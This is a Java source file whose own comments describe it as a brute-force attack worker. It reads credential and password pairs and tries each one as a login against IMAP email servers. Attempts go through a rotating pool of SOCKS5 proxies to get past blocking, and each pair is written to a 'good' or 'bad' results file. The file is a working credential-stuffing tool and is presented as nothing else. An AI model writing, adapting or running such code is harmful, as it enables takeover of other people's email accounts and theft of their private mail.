package org.bsoftware.parcel.domain.runnables;

import com.chilkatsoft.CkImap;
import com.chilkatsoft.CkString;
import lombok.RequiredArgsConstructor;
import lombok.SneakyThrows;
import org.bsoftware.parcel.domain.callbacks.BruteForceCallback;
import org.bsoftware.parcel.domain.components.DataContainer;
import org.bsoftware.parcel.domain.model.Connection;
import org.bsoftware.parcel.domain.model.DataType;
import org.bsoftware.parcel.domain.model.LogLevel;
import org.bsoftware.parcel.domain.model.Proxy;
import org.bsoftware.parcel.domain.model.Source;
import org.bsoftware.parcel.utilities.ConnectionUtility;
import org.bsoftware.parcel.utilities.FileSystemUtility;

import java.io.IOException;

/**
 * BruteForceRunnable is a class that represent worker, which is used for brute-force attack
 *
 * @author Rudolf Barbu
 * @version 1.0.10
 */
@RequiredArgsConstructor
public class BruteForceRunnable implements Runnable
{
    /**
     * Defines proxy socks version
     */
    private static final int PROXY_VERSION = 5;

    /**
     * Defines proxy connection timeout
     */
    private static final int PROXY_CONNECTION_TIMEOUT = 5;

    /**
     * Defines error pattern, that indicate connection impossibility
     */
    private static final String NO_CONNECTION_TO_IMAP_SERVER_ERROR = "<error>No connection to IMAP server.</error>";

    /**
     * Callback interface, which is used to deliver messages to service
     */
    private final BruteForceCallback bruteForceCallback;

    /**
     * Main method of brute-force algorithm
     */
    @Override
    @SneakyThrows
    public void run()
    {
        final CkImap ckImap = new CkImap();

        ckImap.put_SocksVersion(PROXY_VERSION);
        ckImap.put_ConnectTimeout(PROXY_CONNECTION_TIMEOUT);

        try
        {
            Source source;
            while (((source = DataContainer.getNextSource()) != null) && !Thread.currentThread().isInterrupted())
            {
                final Connection connection = ConnectionUtility.getConnection(source.getCredential());

                ckImap.put_Port(connection.getPort());
                ckImap.put_Ssl(connection.isSsl());
                ckImap.put_StartTls(connection.isTls());
                bruteForceCallback.handleDecrementCounter(DataType.SOURCE);

                final Status retrieveStatus = retrieveProxy(ckImap, connection.getHost());

                if (retrieveStatus == Status.GOOD)
                {
                    FileSystemUtility.saveSourceToFile(ckImap.Login(source.getCredential(), source.getPassword()) ? Status.GOOD.name().toLowerCase() : Status.BAD.name().toLowerCase(), source);
                    ckImap.Disconnect();
                }
                else
                {
                    if (retrieveStatus == Status.BAD)
                    {
                        break;
                    }
                    else if (retrieveStatus == Status.ERROR)
                    {
                        FileSystemUtility.saveSourceToFile(Status.ERROR.name().toLowerCase(), source);
                    }
                }
            }
        }
        catch (final IOException ioException)
        {
            bruteForceCallback.handleBruteForceMessage(LogLevel.ERROR, String.format("I/O exception occurred, message: %s", ioException.getMessage()));
        }

        bruteForceCallback.handleThreadInterruption();
    }

    /**
     * Gets new proxy until they available
     *
     * @param ckImap IMAP to probe connection
     * @param host particular IMAP server to connect
     * @return Status.GOOD, retrieved a good proxy
     */
    private Status retrieveProxy(final CkImap ckImap, final String host)
    {
        final CkString currentProxyHostname = new CkString();

        ckImap.get_SocksHostname(currentProxyHostname);
        if (!currentProxyHostname.getString().isEmpty())
        {
            final Status connectionStatus = connectToServer(ckImap, host);
            if (connectionStatus != Status.BAD)
            {
                return connectionStatus;
            }
        }

        Proxy proxy;
        while (((proxy = DataContainer.getNextProxy()) != null) && !Thread.currentThread().isInterrupted())
        {
            ckImap.put_SocksHostname(proxy.getIpAddress());
            ckImap.put_SocksPort(proxy.getPort());
            bruteForceCallback.handleDecrementCounter(DataType.PROXY);

            final Status connectionStatus = connectToServer(ckImap, host);
            if (connectionStatus != Status.BAD)
            {
                return connectionStatus;
            }
        }

        return Status.BAD;
    }

    /**
     * Tries to connect to IMAP server
     *
     * @param ckImap IMAP to probe connection
     * @param host particular IMAP server to connect
     * @return Status.GOOD, if successfully connected
     */
    private Status connectToServer(final CkImap ckImap, final String host)
    {
        if (!ckImap.Connect(host))
        {
            if (ckImap.lastErrorXml().contains(NO_CONNECTION_TO_IMAP_SERVER_ERROR))
            {
                return Status.ERROR;
            }

            return Status.BAD;
        }

        return Status.GOOD;
    }

    /**
     * Enum with all possible statuses
     */
    private enum Status
    {
        ERROR, BAD, GOOD
    }
}